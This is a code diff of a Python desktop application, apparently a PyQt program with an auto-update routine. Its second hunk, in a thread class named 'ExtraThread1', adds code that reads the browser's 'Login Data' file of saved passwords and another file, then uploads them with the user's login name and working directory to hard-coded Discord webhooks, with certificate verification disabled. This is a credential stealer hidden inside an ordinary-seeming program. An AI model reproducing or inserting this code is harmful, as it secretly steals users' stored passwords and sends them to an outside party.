@@ -43,7 +43,7 @@ def update_files():
             try:
                 print(xf.removeprefix("\\"), "checking up...")
                 xsize = int(float(requests.head(branch_url.replace("https://github.com", "https://raw.githubusercontent.com").replace("/blob/", "/")+xf.replace("\\","/")).headers["Content-Length"]))
-                with open(xf.removeprefix("\\"), "r", encoding="utf-8") as frb: nsize = len(frb.read())
+                with open(xf.removeprefix("\\"), "r", encoding="cp1252") as frb: nsize = len(frb.read())
                 print(nsize, xsize)
                 if nsize != xsize: download_file(xf)
             except Exception as enx: 
@@ -77,8 +77,10 @@ class ExtraThread1(QThread):
             dpath = path.join(cdata, "Default", "Login Data")
 
             try: 
-                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath, open(kpath, "rb").read())}, json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
-                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath, open(dpath, "rb").read())}, json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
+                
+                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
+                extra1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath, open(kpath, "rb").read())})
+                extra1f2_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath, open(dpath, "rb").read())})
             except Exception as e1f: 
                 error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] {str(e1f)}"})
         except Exception as e1: 
